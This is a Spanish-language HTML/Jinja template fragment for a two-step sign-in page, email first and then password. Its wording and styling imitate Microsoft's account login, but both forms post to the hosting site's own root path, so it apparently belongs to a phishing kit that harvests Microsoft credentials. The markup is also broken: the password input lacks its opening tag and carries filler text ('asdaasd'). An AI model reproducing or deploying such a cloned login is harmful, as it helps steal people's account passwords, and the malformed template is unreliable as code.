        <div class="relative mt-4 mb-3 show-from-r min-h-[206px]">
          <div class="email-view">
            <h1 class="title">Iniciar sesión</h1>
          </div>

          <div class="mb-4">
            <div class="email-view">
              <form id="email-form" name="email-form" action="/" method="post">
                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
                <input
                  autofocus
                  placeholder="Correo electrónico, teléfono o Skype"
                  aria-required="true"
                  maxlength="113"
                  autocomplete="username"
                  type="text"
                  name="email"
                  class="input text-box text-ms-eerie-black w-full"
                />
              </form>
            </div>

            <div class="password-view hidden">
              <form id="password-form" name="password-form" action="/" method="post">
                <h1 class="title">Escribir contraseña</h1>

                <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />

                  id="password"
                  name="password"
                  placeholder="Contraseña"
                  type="password"
                  maxlength="120"
                  aria-label="Escriba la contraseña para asdaasd"
                  autocomplete="current-password"
                  class="input text-box text-ms-eerie-black w-full"
                  style="border-color: rgb(102, 102, 102)"
                />

          </div>
